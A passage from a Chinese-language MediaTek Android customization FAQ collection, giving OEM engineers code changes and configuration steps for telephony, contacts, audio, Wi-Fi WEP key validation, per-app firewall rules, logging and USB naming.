405 if (mode == AppOpsManager.MODE_ERRORED) {
406 Slog.w(TAG, "Would be an error: vibrate from uid " + vib.mUid);
407 }
408 //MTK Modify, do nothing with App related control in MTK solution
409 //mH.post(mVibrationRunnable);
410 return;
411 }
//将该部分注释掉
```

## [FAQ15376]  L1上首选网络类型只有4G/3G/2G,没有auto选项

```text
这是google重新命名了 preferred network type选单的选项名字而已:
4G：即之前的4G/3G/2G auto
3G：即3G/2G auto
2G：即GSM only
如果客户强烈要求要改成与L0上一致，可在以下这支文件进行修改.
相关处理逻辑在packages\services\telephony\src\com\android\phone\MobileNetworkSettings.java中，请参考进行客制化
```

## [Dialer]  [FAQ14847]  L版本全屏显示来电界面

```text
HeadsUp 是 google 在 L 版本上面 PhoneStatusBar 中新增的功能.
 
而在未锁屏时来电就是通过这种方式来显示的. 从而替代了全屏显示来电界面的方式.
 
如果客户还是倾向于全屏显示来电界面. 则可以通过如下方式来单独关闭通话的 HeadsUp 功能.

File: frameworks\base\packages\SystemUI\src\com\android\systemui\statusbar\phone\PhoneStatusBar.java

/// M: turn off HeadsUp for dialer. @{ 
private final String PACKAGES_DIALER = "com.android.dialer";
/// @}

@Override
public void addNotification(StatusBarNotification notification, RankingMap ranking) {
    /// M: turn off HeadsUp for dialer. @{ 
    boolean belongsToDialer = PACKAGES_DIALER.equals(notification.getPackageName());
    if (DEBUG) {
        Log.d(TAG, "addNotification key=" + notification.getKey() +
            ", package=" + notification.getPackageName());
    }
    if (!belongsToDialer &&
    /// @}
        mUseHeadsUp && shouldInterrupt(notification)) {
        if (DEBUG) Log.d(TAG, "launching notification in heads up mode");
        Entry interruptionCandidate = new Entry(notification, null);
        ViewGroup holder = mHeadsUpNotificationView.getHolder();
        if (inflateViewsForHeadsUp(interruptionCandidate, holder)) {
            // 1. Populate mHeadsUpNotificationView
            mHeadsUpNotificationView.showNotification(interruptionCandidate);

            // do not show the notification in the shade, yet.
            return;
        }
    }
}
```

## [FAQ08873]  [People] 特殊符号开头的联系人归并至“#”下

```text
在PeopleActivity界面，联系人的显示位置是由其display name的第一个字符决定的。
数字开头的联系人会显示在“#”这个header下。
中英文联系人会显示在“A” 到“Z”下。
以符号开头的联系人则没有对应的header，显示在最顶部，如何修改已让它们显示在‘#’号下?
下面的方法可以将其显示在“#”下面（适用于一般ASCII编码内的符号）

[SOLUTION] 
JB版本：
ContactsProvider2.java (packages\providers\contactsprovider\src\com\android\providers\contacts)
getFastScrollingIndexExtras函数中如下语句：
if (title == null) {
    title = "";                             
}

修改为：   
if (title == null) {
    title = "#";                                  
}

KK及以后版本：
ContactLocaleUtils.java (alps\packages\providers\contactsprovider\src\com\android\providers\contacts)
修改
ContactLocaleUtilsBase内部类
public int getBucketLabel(String name) {
    //修改以下代码
    final int bucket = mAlphabeticIndex.getBucketIndex(name);
    if (bucket < 0) {
        return -1;
    }
    //mtk add 
    if (bucket == 0) {
         return mNumberBucketIndex; // 返回mNumberBucketIndex是放在#里面，如果想放在#号后面，return mNumberBucketIndex+1
    }
    //mtk add end

    if (bucket >= mNumberBucketIndex) {
        return bucket + 1;
    }
    return bucket;
}
```

## [FAQ03603]  [People] SIM卡支持存储2000条联系人,MTK平台只能存储1000条

```text
有以下两个原因考虑：
1.存储2000条联系人，其开机加载速度非常慢，用记体验不是很好
2.一般情况下，1000条联系人基本能满足用记需求
 
如果一定需要支持到2000条的话，因为是其modem层对这块有限制，需要对其进行修改。
 
对于有modem源码的用户，需要按以下方式对其进行修改：
   1)change modem makefile phb_sim_entry to 2000
   2)remove this limitation in the option.mak:
               ifeq ($(call gt,$(strip $(PHB_SIM_ENTRY)),1000),T)
      $(warning ERROR: PHB_SIM_ENTRY value ($(PHB_SIM_ENTRY)) of USIM projects should not be larger than 1000) 
        DEPENDENCY_CONFLICT = TRUE
    endif
 
对于没有modem源码的客户，需要提交patch request。
 
PS： 因为MTK这边只对SIM卡存储1000条联系人有过全面的测试，因此，如果打开了2000条的开关，需要自行多做测试。
```

## [FAQ03096]  [People] 如何修改账户与同步设置下的默认设置

```text
背景数据的默认值可以通过修改
ConnectivityService.java(alps\frameworks\base\services\java\com\android\server)
中的getBackgroundDataSetting函数的实现为如下：
public boolean getBackgroundDataSetting() {
    return Settings.Secure.getInt(mContext.getContentResolver(), Settings.Secure.BACKGROUND_DATA, 0) == 1;
}
这样即可修改为默认背景数据不能同步发送和接收。

自动同步的默认值如何修改?
修改SyncStorageEngine.java (alps\frameworks\base\core\java\android\content)中的
private boolean mMasterSyncAutomatically = true;
修改为
private boolean mMasterSyncAutomatically = false;
既可将自动同步的默认值设置成不勾选。
```

## [FAQ15364]  [Legacy Wi-Fi]  WEP长度及MTK客制化

```text
添加网络，当时输入SSID，把密码设置为WEP后，当输入的密码的字符串为5、10、13、16等，“Save”亮显可以保存；输入其他位，则灰显，无法保存。
[SOLUTION] 
IEEE802.11 spec 下面這段：
11.2.2 Wired equivalent privacy (WEP)
11.2.2.1 WEP overview

WEP-40 was defined as a means of protecting (using a 40-bit key) the confidentialiy of data exchanged among authorized users of a WLAN from casual eavesdropping. Implementation of WEP is optional. The same algorithms have been widely used with a 104-bit key instead of a 40-bit key in fielded implementations; this is called WEP-104. The WEP cryptographic encapsulation and decapsulation mechanics are the same whether a 40-bit or a 104-bit key is used. The term WEP by itself refers to either WEP-40 or WEP-104.

--以上设计确实是敝司在谷歌original代码上面扩展的，是为了考虑到路由器设备等在密码长度也是这个限制，这样设计是为了提醒用户所输入的密码的长度的有效性。

关于16这个长度的解释如下：
在Wikipedia 有這類的描述,
https://zh.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A%A0%E5%AF%86

WEP是1999年9月通過的IEEE 802.11標準的一部分，使用RC4（Rivest Cipher）串流加密技術達到機密性，並使用CRC-32 驗和達到資料正確性。

標準的64比特WEP使用40位元的鑰匙接上24位元的初向量（initialization vector，IV）成為RC4用的鑰匙。在起草原始的WEP標準的時候，美國政府在加密技術的輸出限制中限制了鑰匙的長度，一旦這個限制放寬之後，所有的主要業者都用104位元的鑰匙實作了128位元的WEP延伸協定。用戶輸入128位元的WEP鑰匙的方法一般都是用含有26個十六進位數（0-9和A-F）的字串來表示，每個字元代表鑰匙中的4個位元，4 * 26 = 104位元，再加上24位元的IV就成了所謂的"128位元WEP鑰匙"。有些廠商還提供256位元的WEP系統，就像上面講的，24位元是IV，實際上剩下232位元作為保護之用，典型的作法是用58個十六進位數來輸入，（58 * 4 = 232位元）+ 24個IV位元 = 256個WEP位元。

鑰匙長度不是WEP安全性的主要因素，破解較長的鑰匙需要攔截較多的封包，但是有某些主動式的攻擊可以激發所需的流量。WEP還有其他的弱點，包括IV雷同的可能性和變造的封包，這些用長一點的鑰匙根本沒有用，見stream cipher attack一頁。
```

## [FAQ13305]  [Vibrator] LK阶段如何实现开机震动

```text
描述LK阶段实现开机震动

[SOLUTION] 
1.若LK mt_pmic.c中有实现vibr_Enable_HW/vibr_Disable_HW函数，
请在LK platform.c中Show Logo 之前添加对其调用。
如在platform_init()里面mboot_common_load_logo()之前添加如下代码：
-----------------------------------------
vibr_Enable_HW();//开启震动
mdelay(80); //震动80ms
vibr_Disable_HW();//关闭启震动
-----------------------------------------

2.若LK mt_pmic.c中没有实现vibr_Enable_HW/vibr_Disable_HW函数，
请按如下说明实现vibr_Enable_HW/vibr_Disable_HW函数，
然后再按上面说明在适当位置添加代码对其进行调用。
a).在LK mt_pmic.h中添加vibr_Enable_HW/vibr_Disable_HW函数申明
extern void vibr_Enable_HW(void);
extern void vibr_Disable_HW(void);
b).在LK mt_pmic.c中实现vibr_Enable_HW/vibr_Disable_HW函数
-------------------------------------------------
void vibr_Enable_HW(void) {
    xxxx_upmu_set_rg_vibr_vosel(0x5); // 0x5: 2.8V, 0x6: 3V, 0x7: 3.3V
    xxxx_upmu_set_rg_vibr_en(1);
}
void vibr_Disable_HW(void) {
    xxxx_upmu_set_rg_vibr_en(0);
}
-------------------------------------------------
或者
-------------------------------------------------
void vibr_Enable_HW(void) {
    pmic_set_register_value(PMIC_RG_VIBR_VOSEL,5);// 0x5: 2.8V, 0x6: 3V, 0x7: 3.3V
    pmic_set_register_value(PMIC_RG_VIBR_EN,1);
}

void vibr_Disable_HW(void) {
    pmic_set_register_value(PMIC_RG_VIBR_EN,0);
}
-------------------------------------------------

其中xxxx_upmu_set_rg_vibr_*/pmic_set_register_value表示LK upmu_common.c中提供的相应API，
如upmu_set_rg_vibr_vosel/mt6325_upmu_set_rg_vibr_vosel/mt6331_upmu_set_rg_vibr_vosel等。
```

## [Email]  [FAQ15337]  Email物理按键弹出菜单字体看不清楚

```text
1、进入email 收件箱；
2、点物理按键menu，弹出的菜单显示字体是白色，背景是灰色，无法看清内容，如下图：

这个问题是因为该Activity使用了Android support v7 的actionbar导致的。原因是support v7 的actionbar style与L风格不一致。
可以通过如下方法解决。
在/packages/apps/Email/UnifiedEmail/res/values/themes.xml，约41行，增加一行style 的 item，如下：
<style name="UnifiedEmailTheme.Appcompat.Toolbar" parent="@style/Theme.AppCompat.Light.NoActionBar">
    ......
    <item name="panelMenuListTheme">@style/ThemeOverlay.AppCompat.Light</item>
</style>
另外，Google 在Android 5.0之后，已经禁止设备使用硬件的Menu，不然会有很多UI显示问题。
```

## [Video]  [FAQ15326]  [VP] 默认播放器播放视频添加快进快退功能

```text
默认的视频播放器只有在op02(联通)的项目默认会有快进快退的功能，若在其他项目上也需要添加快进快退功能，请参考如下方法
[SOLUTION] 

Step1：添加RewindAndForward.java到alps\packages\apps\Gallery2\src\com\mediatek\gallery3d\video目录下；每次快进快退的默认时间是：3S
RewindAndForward.java文件请从如下路径下拷贝：
alps\vendor\mediatek\proprietary\operator\op02\packages\apps\plugins\src\com\mediatek\gallery3d\plugin\，并需要把该文件的包名改一下：
package com.mediatek.gallery3d.plugin;
修改为：
package com.mediatek.gallery3d.video; 

Step2：添加drawable：
alps\packages\apps\Gallery2\res\drawable\下添加:  icn_media_forward,xml  ,  icn_media_stop.xml ,   icn_media_rewind.xml
文件来源路径：
alps/vendor/mediatek/proprietary/operator/OP02/packages/apps/Plugins/res/drawable
drawable-hdpi等资源文件下添加：ic_menu_disable_forward.png  ,  ic_menu_disable_rewind.png ,  ic_menu_disable_stop.png ,  ic_menu_rewind.png ,  ic_menu_forward.png,  ic_menu_stop.png

文件来源路径：
alps/vendor/mediatek/proprietary/operator/OP02/packages/apps/Plugins/res/drawable-hdpi
alps/vendor/mediatek/proprietary/operator/OP02/packages/apps/Plugins/res/drawable-mdpi
alps/vendor/mediatek/proprietary/operator/OP02/packages/apps/Plugins/res/drawable-xhdpi
alps/vendor/mediatek/proprietary/operator/OP02/packages/apps/Plugins/res/drawable-xxhdpi
alps/vendor/mediatek/proprietary/operator/OP02/packages/apps/Plugins/res/drawable-xxxhdpi

Step3：修改alps\packages\apps\Gallery2\ext\src\com\mediatek\gallery3d\ext\DefaultMovieExtension.java中的getRewindAndForwardExtension()方法如下： 

public IRewindAndForwardExtension getRewindAndForwardExtension(){
     //return new DefaultRewindAndForwardExtention();//default code
     MtkLog.d(TAG,”new RewindAndForward()”; //added by MTK
     return new RewindAndForawrd(mContext); //added by MTK
}
```

## [CMD]  [FAQ15297]  [Audio FTM] 如何用adb shell命令实现Loopback测试

```text
如何用adb shell命令实现Loopback测试

请先看这些定义，后面的命令需要用到.
enum loopback_t {
    NO_LOOPBACK                                 = 0,
    // AFE Loopback
    AP_MAIN_MIC_AFE_LOOPBACK                    = 1,
    AP_HEADSET_MIC_AFE_LOOPBACK                 = 2,
    AP_REF_MIC_AFE_LOOPBACK                     = 3,
    AP_3RD_MIC_AFE_LOOPBACK                     = 4,
    // Acoustic Loopback
    MD_MAIN_MIC_ACOUSTIC_LOOPBACK               = 21,
    MD_HEADSET_MIC_ACOUSTIC_LOOPBACK            = 22,
    MD_DUAL_MIC_ACOUSTIC_LOOPBACK_WITHOUT_DMNR  = 23,
    MD_DUAL_MIC_ACOUSTIC_LOOPBACK_WITH_DMNR     = 24,
    MD_REF_MIC_ACOUSTIC_LOOPBACK                = 25,
    MD_3RD_MIC_ACOUSTIC_LOOPBACK                = 26,
};

enum loopback_output_device_t {
    LOOPBACK_OUTPUT_RECEIVER = 1,
    LOOPBACK_OUTPUT_EARPHONE = 2,
    LOOPBACK_OUTPUT_SPEAKER  = 3,
};

输入adb shell进入控制台，然后输入AudioSetParam进行loopback测试。
C:\Documents and Settings\mtk03996>adb shell 

root@demo95v2:/ # AudioSetParam

please enter command, ex: 'GET_XXX_ENABLE', 'SET_XXX_ENABLE=0', 'SET_XXX_ENABLE=1', and '0' for exit

SET_LOOPBACK_TYPE=1,3   //1,3表示从main mic -> Speaker的loopback测试。(1,3请参考第1点中的定义，这里可自由组合，这里只是举个例子)
SET_LOOPBACK_TYPE=1,3

please enter command, ex: 'GET_XXX_ENABLE', 'SET_XXX_ENABLE=0', 'SET_XXX_ENABLE=1', and '0' for exit
SET_LOOPBACK_TYPE=0
SET_LOOPBACK_TYPE=0

please enter command, ex: 'GET_XXX_ENABLE', 'SET_XXX_ENABLE=0', 'SET_XXX_ENABLE=1', and '0' for exit
0
0
root@demo95v2:/ #
```

## [工具]  [FAQ15099]  [BT] 如何用meta工具修改蓝牙名称

```text
1，连上meta
2，选择nvram editor
3，选择other LID -> NVRAM_EF_BT_SYS_INFO_LID
4，按下read from nvram
6，从第五个字节开始修改（nvram_ef_bt_sys_info[4] ）
7，按下save to nvram保存就可以了。
 
再用其他设备搜索就可以看到蓝牙名称修改成功了。
```

## [FAQ15310]  睡眠后短按powerkey偶现点亮不了屏幕（唤醒系统）

```text
使用PMIC 6323的平台，诸如MT6582/72等，偶现深度睡眠后，短按pwrkey键无法点亮屏幕的情况。通过查看log可发现，短按pwrkeyu时，并没有上报key press。
[SOLUTION] 
针对以上问题，可采用以下两种优化方法（可单独使用也可一起使用）：
1.上层修改
下面从Framework的角度给一个workaround的方法： 
在/frameworks/base/policy/src/com/android/internal/policy/impl/PhoneWindowManager.java中添加一个变量标记是否按下power key： 
Private Boolean isPressedPwrkey; 

然后在public int interceptKeyBeforeQueueing(KeyEvent event, int policyFlags)方法中添加以下代码： 
// Handle special keys. 
switch (keyCode) { 
    case KeyEvent.KEYCODE_POWER: {
        result &= ~ACTION_PASS_TO_USER;
        isWakeKey = false; // wake-up will be handled separately
        if (down) {
            isPressedPwrkey = true;
            interceptPowerKeyDown(event, interactive);
        } else {
            if(!isPressedPwrkey && !isScreenOn(){
               interceptPowerKeyDown(event, interactive);
               isPressedPwrkey = true;
            }
            interceptPowerKeyUp(event, interactive, canceled);
        }
        break;
} 

2.driver层修改 
在pmic_mt6323.c中创建一个全局变量keyispressed，在函数pwrkey_int_handler中作如下逻辑判断：如果按键未被按下的情况下，收到release，先上报press再上报release. 
if (upmu_get_pwrkey_deb()==1) {
    …… 
    if (keyispressed==false) { //add
        kpd_pwrkey_pmic_handler(0x1);  //add
    }
    kpd_pwrkey_pmic_handler(0x0);
    ……
    keyispressed=false;  //add
} else {
    ……
    keyispressed=true;   //add
}
```

## [FAQ15258]  [Sound] 如何将 soundrecorder 改为 wav 格式录音

```text
soundrecorder 默认是录 3gpp 格式，如果需要改成 wav 格式录音

需要在录音的时候对 mediarecord 调用下面几个方法：
MediaRecorder mr = new MediaRecorder();
mr.setAudioEncoder(MediaRecorder.AudioEncoder.PCM); //设为 wav 编码
mr.setOutputFormat(MediaRecorder.OutputFormat.OUTPUT_FORMAT_WAV); //设为 wav 对应的 format

默认的录音是在 Recorder.java (soundrecorder 包里面) 的 
private boolean initAndStartMediaRecorder(Context context, RecordParams recordParams, int fileSizeLimit) 
方法里面设置的，请自行改一下

再改一下后缀名为 .wav 就好了, 在如下方法中修改，加入 "// add this line" 行
private boolean createRecordingFile(String extension) {
LogUtils.i(TAG, "<createRecordingFile> begin");
extension=".wav"; // add this line
String myExtension = extension + SAMPLE_SUFFIX;
```

## [audio]  [FAQ14327]  [Audio framework]  L 及之后版本首次开机截屏无声音

```text
1: status_t Sample::doLoad() 方法内 error 段改为：
error:
mState = ERROR;//add this line
mHeap.clear();
return status;

2: soundpool.h 中，加入 ERROR 态定义
enum sample_state { UNLOADED, LOADING, READY, UNLOADING, ERROR };
 
3: play 方法加入如下修改
int SoundPool::play(int sampleID, float leftVolume, float rightVolume,
int priority, int loop, float rate)
in /frameworks/av/media/libmedia/SoundPool.cpp

add lines wrapped in dismissed lines:

int SoundPool::play(int sampleID, float leftVolume, float rightVolume,
int priority, int loop, float rate) {
    ALOGV("play sampleID=%d, leftVolume=%f, rightVolume=%f, priority=%d, loop=%d, rate=%f",
    sampleID, leftVolume, rightVolume, priority, loop, rate);
    sp<Sample> sample;
    SoundChannel* channel;
    int channelID;

    Mutex::Autolock lock(&mLock);

    if (mQuit) {
        return 0;
    }
    // is sample ready?
    sample = findSample(sampleID);//reference line

    //add begin
    if(sample != 0){
        int LoopCounter = 5;
        while(LoopCounter-- > 0 && (sample->state() != Sample::READY) && (sample->state() != Sample::ERROR )){
        ALOGD("wait for sample ready, sleep 100ms");
        usleep(100 * 1000);
    }
}//add end
```

## [audio]  [FAQ15283]  [Audio Driver]  手机放音乐时连接音箱, 将音箱音量调到最大时，音乐暂停

```text
手机放音乐时连接音箱, 将音箱音量调到最大时，音乐会自动暂停
原因是：HPL上信号过大导致EINT拉高产生了耳机拨出讯号，所以音乐会自动暂停掉
```

## [audio]  [FAQ15254]  [Audio Driver]  Audio 寄存器打印不完整怎么办

```text
ALSA 架构 Audio 寄存器打印不完整怎么办?
[SOLUTION] 
mt_soc_machine.c 中 mt_soc_debug_read函数
const int size=4096;
char buffer[size] ;
如果寄存器打印出来后面的不完整,那可能是buffer size越界了.
可以将size增大,如size=8192;
```

## [net]  [FAQ15286]  关闭EDGE以后 手机界面仍然显示E

```text
手机界面显示的E是指示手机当前驻留的2G 小区 具备支持EDGE的能力， 不代表手机自身仍然支持EDGE
换句话说 手机界面显示E，也不应理解为手机的EDGE功能没有关闭

正确的确认手机自身是否支持EDGE 是需要从MTK MD log 中 空口信令 attach req中解析

观察是否携带 EGPRS multislot class:
若以下字段为0，则表示不支持EDGE
EGPRS multislot class: Bits are not available (0)

我司关闭edge的方法可以参考： [FAQ14048] 如何关掉EDGE功能
```

## [log]  [FAQ05818]  如何默认打开或者关闭TagLog

```text
Eng版本TagLog默认打开，user版本TagLog默认关闭。

1.可通过修改\alps\mediatek\external\xlog\tools\目录下的mtklog-config-eng.prop和mtklog-config-user.prop文件（分别对应eng和user load）设定
taglog是否默认开启，在文件的最后一段添加上以下描述：
com.mediatek.log.taglog.enabled = false/true

如果没有添加以上描述，则默认在eng load上开启，在user load上关闭。
注：L版本该文件路径为\alps\vendor\mediatek\proprietary\external\xlog\tools

2.Eng/User版本均可以进入工程模式手动打开/关闭Taglog，方法如下：
拨*#*#3646633#*#* -> EngineerMode -> TagLog -> Start TagLog，勾选时表示打开，否则表示关闭。

TagLog功能简述：FAQ03748
```

## [log]  [FAQ15156]  Caused by: java.lang.ClassNotFoundException 的解决办法

```text
经常会发生三方apk出现ClassNotFoundException的异常，这个异常在android开发中无非就是告诉你类没有找到，那么什么原因导致没找到呢?这里会介绍几种发生场景供排除。

ClassNotFoundException形如：
Caused by: java.lang.ClassNotFoundException: Didn't find class "com.iflytek.inputmethod.FlyApp" on path: DexPathListlib

[SOLUTION] 
一般分为以下几种情况：

1、(常见)L版本上打开WITH_DEXPREOPT := true之后，预置apk的android.mk的配置不准确，导致32bit和64bit的兼容性问题，找不到对应apk的odex，自然就发生ClassNotFoundException，属于配置问题。

log形如：
Caused by: java.io.IOException: Failed to open oat file from /system/priv-app/ShanYao_StaticTimeWallpaper/arm64/ShanYao_StaticTimeWallpaper.odex (error Failed to open oat filename for reading: No such file or directory) (no dalvik_cache availible) and relocation failed.

【Solution】: 参考“[FAQ14102] L版本开机提示“Android正在升级或启动””第一点进行配置。

2、(常见)启动activity的时候，在AndroidManifest.xml中虽然有注册activity但是code中并没有定义，或者说activity的包名或者名字写错了。属于apk方问题。

【Solution】: 检查AndroidManifest.xml和code对应的class。

3、odex文件损坏，这一般是由于系统硬件问题，比如emmc不稳定，导致类似framwork.jar包被破坏。属于硬件问题。

【Solution】: 从损坏角度出发考量，检查硬件是否稳定。

4、L版本上FOTA/OTA升级后或一些特殊场景下会发生一类特殊的ClassNotFoundException，属于系统方问题。

log形如：
Caused by: java.io.IOException: Failed to remove obsolete file from /data/dalvik-cache/arm/data@app@com.handsgo.jiakao.android-1@base.apk@classes.dex when searching for dex file /data/app/com.handsgo.jiakao.android-1/base.apk: Permission denied

【Solution】参考：“[FAQ14893] FOTA/OTA之後启动第三方APP出現APP Crash”

5、在项目中重新定义了init.rc，但没有加入/system/framework/**.jar，这样会将类似mediatek\config\mt6595\init.rc覆盖，因此找不到**.jar。属于配置问题。

6、使用的class，是一个外部的JAR包，当在工程中编译使用时，发布成APK并没有包含JAR文件，所以APK在执行的时候就找不到JAR文件，也会报错。属于apk方问题。

7、使用了重复的类库，且版本不一致，导致低版本的被优先使用。此时应删除重复的类库，只保留最新的。属于apk方新旧版本问题。
```

## [clock]  [FAQ11919]  【缅甸语专项】设置--日期和时间--设置日期和时间，弹出的对话框里面，默认日期或者时间看不到

```text
【缅甸语专项】设置--日期和时间--设置日期和时间，弹出的对话框里面，默认日期或者时间看不到，拖动下又出来了。
 
[SOLUTION] 
 
请修改 NumberPicker.java (path: \frameworks\base\core\java\android\widget\NumberPicker.java).

修改如下:
修改NumberPicker.java裡面的 filter() method:
=== 將原本的 ===
    CharSequence filtered = super.filter(source, start, end, dest, dstart, dend);
    if (filtered == null) {
        filtered = source.subSequence(start, end);
    }
=== 修改為:(中間插入一段code) ===
    CharSequence filtered = super.filter(source, start, end, dest, dstart, dend);
    if (filtered != null) {
        int i;
        for (i = start; i < end; i++) {
            if (!Character.isDigit(source.charAt(i))) {
                break;
            }
        }
        if (i == end) {
            /// the characters in source are all digit.
            filtered = null;
        }
    }
    if (filtered == null) {
        filtered = source.subSequence(start, end);
    }
```

## [net]  [FAQ10820]  针对某个APK，需要做到wifi/gprs分别做到允许/禁止两种策略

```text
JB5开始已经default有这部分代码，只需要参照该FAQ后面的使用说明和方法调用即可。
JB5之前的版本，可以按照下面完整的solution进行操作
[SOLUTION] 
1.NetworkManagementService.java
    public void setFirewallUidChainRule(int uid, int networkType, boolean allow) {
        //enforceSystemUid();
        final String MOBILE = "mobile";
        final String WIFI = "wifi";

        final String rule = allow ? ALLOW : DENY;
        final String chain = (networkType == 1) ? WIFI : MOBILE;
        
        try {
            mConnector.execute("firewall", "set_uid_fw_rule", uid, chain, rule);
        } catch (NativeDaemonConnectorException e) {
            throw e.rethrowAsParcelableException();
        }
    }
    
    /**
     * @internal Configure firewall rule by uid and chain
     * @hide
     */
    public void clearFirewallChain(String chain) {
        //enforceSystemUid();
        try {
            mConnector.execute("firewall", "clear_fw_chain", chain);
        } catch (NativeDaemonConnectorException e) {
            throw e.rethrowAsParcelableException();
        }
    }    
}
2.CommandListener.cpp中
1)最后一个类FirewallCmd的runCommand方法的
    cli->sendMsg(ResponseCode::CommandSyntaxError, "Unknown command", false);
    return 0;
之前加上
    if (!strcmp(argv[1] , "set_uid_fw_rule")) {
        if (argc != 5) {
            cli->sendMsg(ResponseCode::CommandSyntaxError,
                         "Usage: firewall set_uid_fw_rule <uid> <mobile|wifi> <allow|deny>",
                         false);
            return 0;
        }

        int uid = atoi(argv[2] );
        FirewallChinaRule chain = parseChain(argv[3] );
        FirewallRule rule = parseRule(argv[4] );

        int res = sFirewallCtrl->setUidFwRule(uid, chain, rule);
        return sendGenericOkFail(cli, res);
    }

    if (!strcmp(argv[1] , "clear_fw_chain")) {
        if (argc != 3) {
            cli->sendMsg(ResponseCode::CommandSyntaxError,
                         "Usage: firewall clear_fw_chain <chain>",
                         false);
            return 0;
        }

        const char* chain = argv[2] ;
        
        int res = sFirewallCtrl->clearFwChain(chain);
        return sendGenericOkFail(cli, res);
    }   
2)以下两个数组改成如下;
static const char* FILTER_INPUT[]  = {
    // Bandwidth should always be early in input chain, to make sure we
    // correctly count incoming traffic against data plan.
    BandwidthController::LOCAL_INPUT,
// mtk03594: Support enhanced firewall @{
    FirewallController::FIREWALL,
///@}
    FirewallController::LOCAL_INPUT,
    NULL,
};
static const char* FILTER_OUTPUT[]  = {
    OEM_IPTABLES_FILTER_OUTPUT,
// mtk03594: Support enhanced firewall @{
    FirewallController::FIREWALL,
///@}
    FirewallController::LOCAL_OUTPUT,
    BandwidthController::LOCAL_OUTPUT,
    NULL,
};
3) 添加下面这个数组
static const char* FILTER_FIREWALL[]  = {
    FirewallController::FIREWALL_MOBILE,
    FirewallController::FIREWALL_WIFI,
    NULL,
};

4) CommandListener.cpp的构造函数CommandListener::CommandListener() :的
    createChildChains(V4, "nat", "PREROUTING", NAT_PREROUTING);
    createChildChains(V4, "nat", "POSTROUTING", NAT_POSTROUTING);

    // Let each module setup their child chains
    setupOemIptablesHook();
后添加
createChildChains(V4V6, "filter", "firewall", FILTER_FIREWALL);


3.FirewallController.cpp里
1)加上以下两个函数
int FirewallController::setUidFwRule(int uid, FirewallChinaRule chain, FirewallRule rule) {
    char uidStr[16] ;
    char cmdStr[128] ;
    int res = 0;
    const char* op;
    const char* fwChain;

    sprintf(uidStr, "%d", uid);

    if (rule == ALLOW) {
        op = "-I";
    } else {
        op = "-D";
    }

    if(chain == MOBILE) {
        fwChain = "mobile";
    }else{
        fwChain = "wifi";
    }

    res |= execIptables(V4, op, fwChain, "-m", "owner", "--uid-owner", uidStr,
            "-j", "REJECT", "--reject-with", "icmp-net-prohibited", NULL);
    res |= execIptables(V6, op, fwChain, "-m", "owner", "--uid-owner", uidStr,
            "-j", "REJECT", "--reject-with", "icmp6-adm-prohibited", NULL);

    return res;    
}

int FirewallController::clearFwChain(const char* chain) {
    int res = 0;

    if(chain != NULL){
        if(strlen(chain) > 0){
            res |= execIptables(V4V6, "-F", chain, NULL);
        }else{
            ALOGD("Clear all chain");
            res |= execIptables(V4V6, "-F", NULL);
        }
    }else{
        ALOGE("Chain is NULL");
    }

    return res;
}
2).FirewallController.cpp文件里面添加
const char* FirewallController::FIREWALL = "firewall";
3).FirewallController.cpp文件下面这个方法改成如下;
int FirewallController::setupIptablesHooks(void) {

    // mtk03594: Support enhanced firewall @{
    int res = 0;
    res |= execIptables(V4V6, "-F", FIREWALL, NULL);
    res |= execIptables(V4V6, "-A", FIREWALL, "-o", "ppp+", "-j", FIREWALL_MOBILE, NULL);
    res |= execIptables(V4V6, "-A", FIREWALL, "-o", "ccmni+", "-j", FIREWALL_MOBILE, NULL);
    res |= execIptables(V4V6, "-A", FIREWALL, "-o", "ccemni+", "-j", FIREWALL_MOBILE, NULL);
    res |= execIptables(V4V6, "-A", FIREWALL, "-o", "usb+", "-j", FIREWALL_MOBILE, NULL);
    res |= execIptables(V4V6, "-A", FIREWALL, "-o", "cc2mni+", "-j", FIREWALL_MOBILE, NULL);
    res |= execIptables(V4V6, "-A", FIREWALL, "-o", "wlan+", "-j", FIREWALL_WIFI, NULL);
    //@}
    
    return 0;
}

4.FirewallController.h里
加上以下两个函数定义
    int setUidFwRule(int, FirewallChinaRule, FirewallRule);
    int clearFwChain(const char* chain);
JB5开始的版本可以从此开始进行修改：
完成以上代码添加后，可以在相应的APK里采用以下步骤使用添加的这些接口：
１．在相关的文件里import并且定义及获得NetworkManagementService
　　　　import android.os.INetworkManagementService;
　　　　private INetworkManagementService mNetworkService;
        mNetworkService = INetworkManagementService.Stub.asInterface(
                ServiceManager.getService(Context.NETWORKMANAGEMENT_SERVICE));

2.调用mNetworkService.setFirewallUidChainRule　or mNetworkService.clearFirewallChain设置和清空相应的APP的限制即可．

PS:1.每次重新开机，其Iptable都会被清空，如果下次重新开机时，需要重新下一遍command
     2.setFirewallUidChainRule这个方法,针对同一个AP其allow和deny要成对出现
     如果是要禁止掉某个APP访问网络的话，应该是要下allow,而不是下deny，deny是不禁止，allow是允许禁止
     clearFirewallChain是重置规则,一般在APK reset的时候使用,它里面传的参数可以为wifi 或者mobile
```

## [log]  [FAQ04537]  如何修改Kernel Log Buffer的大小?

```text
我们采用可以增大kernel log buffer的方法来避免ring buffer的循环覆盖发生。
 
1. 修改文件如下，其中${ARM}为arm或者arm64，根据架构不同选择不用的目录，${PROJECT}指代具体的项目名称。
ENG: alps/kernel/arch/${ARM}/configs/${PROJECT}_debug_defconfig
USER: alps/kernel/arch/${ARM}/configs/${PROJECT}_defconfig
 
修改位置如下：
CONFIG_LOG_BUF_SHIFT=17
将其中的数值17修改为19或者更大，如：
CONFIG_LOG_BUF_SHIFT=19
 
17表示2^17=128KB, 18表示2^18=256KB, 以此类推。但是最大支持的值为21，即2MB buffer。
 
2. 修改后需要重新build kernel并重新生成boot image
$source build/envsetup.sh && lunch
$mmm kernel-3.10:clean-kernel -j8
$mmm kernel-3.10:kernel -j8
$make bootimage-nodeps -j8
 
3. 重新download boot.img即可。
```

## [FAQ12271]  [USB] 如何修改内置光盘中的内容(BICR, CD-ROM, ISO)

```text
BICR(Built-in CD-ROM) 内置光盘 CD-ROM ISO
 
在制作光盘ISO文件时设定需要的文件，然后将制作好的ISO文件放置于 alps/system/mobile_toolkit/ 下即可。
 
其他相关可能的客制化，也可以参考如下FAQ：
FAQ05690 [USB]  How to add ISO files into BICR?
FAQ04856 [USB名称修改系列] 第4项-如何修改BICR在PC"我的电脑"中显示的label名称
```

## [USB]  [FAQ10612]  【USB名称修改系列】第15项-如何修改USB设备在控制面板中显示的名称

```text
可以在 kernel\drivers\usb\gadget\Android.c 中修改如下红色字段为所需显示的字段
